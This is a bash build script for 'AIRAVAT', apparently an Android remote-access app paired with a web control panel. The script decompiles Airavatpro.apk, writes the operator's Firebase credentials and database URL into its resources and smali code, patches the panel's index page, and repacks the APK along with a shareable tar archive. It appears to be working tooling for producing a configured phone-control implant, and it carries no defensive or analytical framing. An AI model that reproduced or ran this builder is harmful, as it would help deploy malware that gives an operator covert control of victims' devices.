#!/bin/bash
Black='\033[0;30m'
Red='\033[0;31m'
Green='\033[0;32m'
IGreen='\033[0;92m'
Yellow='\033[0;33m'
IYellow='\033[0;93m'
Blue='\033[0;34m'
Purple='\033[0;35m'
Cyan='\033[0;36m'
White='\033[0;37m'
clear='\033[0m'

downloadinggg()
{
if [[ -d $PWD/AIRAVAT ]]
then
echo -e "[${Green}✔${clear}] ${Yellow}AIRAVAT DIRECTORY ALREADY EXIST${clear}"
else
echo -e "[${Green}✔${clear}] ${Yellow}Downloading files...${clear}"
wget https://github.com/efxtv/EFX-Tv-Bookmarks/raw/main/bin/AIRAVAT.zip -O ~/AIRAVAT.zip -q --show-progress
unzip ~/AIRAVAT.zip 1>/dev/null
fi
}

web() 
{
if [[ -d $PWD/AIRAVAT/"WEB PANEL" ]]
then
cat $PWD/AIRAVAT/"WEB PANEL"/index_back.html >$PWD/AIRAVAT/"WEB PANEL"/index.html
sleep 0.5
echo -e "[${Green}✔${clear}] ${Yellow}Checking...${clear}"
echo -e "[${Green}✔${clear}] ${Yellow}"WEB PANEL" found${clear}"
echo -e "[${Green}✔${clear}] ${Yellow}"Restored Index file" found${clear}"
else
echo -e "[${Green}X${clear}] ${Red}WEB PANNEL missing...${clear}"
exit
fi
}

const() 
{
if [[ -e $PWD/const.txt ]]
then
echo -e "[${Green}✔${clear}] ${Yellow}Checking...${clear}"
echo -e "[${Green}✔${clear}] ${Yellow}"const.txt" found${clear}"
else
echo -e "[${Green}X${clear}] ${Red}const.txt missing...${clear}"
exit
fi
}

json() 
{
if [[ -e $PWD/google-services.json ]]
then
echo -e "[${Green}✔${clear}] ${Yellow}Checking...${clear}"
echo -e "[${Green}✔${clear}] ${Yellow}"google-services.json" found${clear}"
else
echo -e "[${Green}X${clear}] ${Red}google-services.json missing...${clear}"
exit
fi
}

insta() 
{
if [[ -e $PWD/AIRAVAT/'ANDROID APP'/Airavatpro.apk ]]
then
echo -e "[${Green}✔${clear}] ${Yellow}Checking...${clear}"
echo -e "[${Green}✔${clear}] ${Yellow}Airavatpro.apk found${clear}"
else
echo -e "[${Green}X${clear}] ${Red}Airavatpro.apk missing...${clear}"
exit
fi
}

decompile() 
{
if [[ -d $PWD/Airavatpro ]]
then
echo -e "[${Green}✔${clear}] ${Yellow}Checking...${clear}"
echo -e "[${Green}✔${clear}] ${Yellow}Airavatpro directory found${clear}"
echo -e "[${Green}✔${clear}] ${Yellow}Deleting Airavatpro directory${clear}"
rm -rf Airavatpro 1>/dev/null
echo -e "[${Green}✔${clear}] ${Yellow}Decompiling Airavatpro APK${clear}"
apktool d $PWD/AIRAVAT/'ANDROID APP'/Airavatpro.apk 1> /dev/null
echo -e "[${Green}✔${clear}] ${Yellow}Done APK${clear}"
else
echo -e "[${Green}✔${clear}] ${Yellow}Decompiling Airavatpro APK${clear}"
apktool d $PWD/AIRAVAT/'ANDROID APP'/Airavatpro.apk 1> /dev/null
echo -e "[${Green}✔${clear}] ${Yellow}Done APK${clear}"
exit
fi
}

strings() 
{
if [[ -e $PWD/Airavatpro/res/values/strings.xml ]]
then
echo -e "[${Green}✔${clear}] ${Yellow}Checking...${clear}"
echo -e "[${Green}✔${clear}] ${Yellow}strings.xml found${clear}"
else
echo -e "[${Green}X${clear}] ${Red}strings.xml missing...${clear}"
fi
}

editconstindex(){
sed -i.backup ' '/^$/d' ' const.txt;sed -i '16,25d' AIRAVAT/'WEB PANEL'/index.html;sed -i '16 e cat $PWD/const.txt' AIRAVAT/'WEB PANEL'/index.html 
}

firebaseurll=$(cat $PWD/google-services.json |grep firebase_url|sed 's#"# " #g'|awk '{print $6}')
googleapikeyy=$(cat $PWD/google-services.json |grep -A 2 api|sed -n '3p'|sed 's#"# " #g'|awk '{print $6}')
googleappidd=$(cat $PWD/google-services.json |grep app_id|sed 's#"# " #g'|awk '{print $6}')
googlestoragebucket=$(cat $PWD/google-services.json |grep bucket|sed 's#"# " #g'|awk '{print $6}')
projectidd=$(cat $PWD/google-services.json |grep project_id|sed 's#"# " #g'|awk '{print $6}')
databaseurlll=$(cat $PWD/const.txt|grep databaseURL|sed 's#"# " #g'|awk '{print $3}')

changessss(){
#firebaseurll
sed -i "s#firebase_database_url</string>#$firebaseurll</string>#g" $PWD/Airavatpro/res/values/strings.xml
sed -i "s#google_api_key</string>#$googleapikeyy</string>#g" $PWD/Airavatpro/res/values/strings.xml
sed -i "s#google_app_id</string>#$googleappidd</string>#g" $PWD/Airavatpro/res/values/strings.xml
sed -i "s#google_storage_bucket</string>#$googlestoragebucket</string>#g" $PWD/Airavatpro/res/values/strings.xml
sed -i "s#project_id</string>#$projectidd</string>#g" $PWD/Airavatpro/res/values/strings.xml
sed -i "s#databaseURL#$databaseurlll#g" $PWD/Airavatpro/smali_classes3/lizord/demon/MainActivity.smali
}

tars(){
tar cvf Airavat_shared.tar Airavatpro 1>/dev/null
}

compilee(){
apktool b Airavatpro -o output.apk 1>/dev/null
}

endings(){
sleep 3
echo -e "[${Green}✔${clear}] ${Yellow}Database added...${clear}"


sleep 3
echo -e "[${Green}✔${clear}] ${Yellow}Strings modified...${clear}"

sleep 3
echo -e "[${Green}✔${clear}] ${Yellow}Creating TAR for shared...${clear}"

sleep 3
echo -e "[${Green}✔${clear}] ${Yellow}Compile apk (may face error)...${clear}"
echo -e "[${Green}✔${clear}] ${Yellow}Use tar file on Windows or ApktoolM${clear}"


sleep 3
echo -e "[${Green}✔${clear}] ${Yellow}Ok...${clear}"


sleep 3
echo -e "[${Green}✔${clear}] ${Yellow}Ok...${clear}"


sleep 3
echo -e "[${Green}✔${clear}] ${Yellow}Ok...${clear}"


sleep 3
echo -e "[${Green}✔${clear}] ${Yellow}Ok...${clear}"


sleep 3
echo -e "[${Green}✔${clear}] ${Yellow}Ok...${clear}"
}
#downloadinggg
web
sleep 0.5
const
sleep 0.5
json
sleep 0.5
insta
sleep 0.5
decompile
sleep 0.5
strings
sleep 0.5
editconstindex
sleep 0.5
changessss
sleep 0.5
tars
sleep 0.5
compilee
sleep 0.5
endings
